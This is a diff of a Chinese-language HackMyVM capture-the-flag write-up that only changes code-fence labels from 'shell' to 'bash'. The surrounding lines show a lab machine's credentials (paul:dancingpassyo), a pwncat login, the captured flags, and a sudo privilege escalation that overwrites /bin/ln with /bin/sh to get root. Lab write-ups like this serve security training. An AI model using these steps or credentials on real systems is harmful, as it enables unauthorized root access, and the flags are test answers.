@@ -57,7 +57,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 查看原始返回
 
-```shell
+```bash
 ┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-Vulny]
 └──╼ $http get http://192.168.56.110/
 HTTP/1.1 200 OK
@@ -143,7 +143,7 @@ paul:dancingpassyo
 
 登陆成功
 
-```shell
+```bash
 ┌─[randark@randark-Parrot]─[~]
 └──╼ $pwncat-cs paul@192.168.56.110
 [11:24:13] Welcome to pwncat 🐈!                                                                                      __main__.py:164
@@ -157,7 +157,7 @@ paul
 
 ## user pwned
 
-```shell
+```bash
 (remote) paul@helium:/home/paul$ cat user.txt
 ilovetoberelaxed
 ```
@@ -176,7 +176,7 @@ User paul may run the following commands on helium:
 
 ## 尝试提权
 
-```shell
+```bash
 (remote) paul@helium:/home/paul$ sudo ln -fs /bin/sh /bin/ln
 (remote) paul@helium:/home/paul$ sudo ln
 [](remote)[] []root@helium[]:[]/home/paul[]$ whoami
@@ -185,7 +185,7 @@ root
 
 ## root pwned
 
-```shell
+```bash
 [](remote)[] []root@helium[]:[]/root[]$ cat root.txt
 ilovetoberoot
 ```
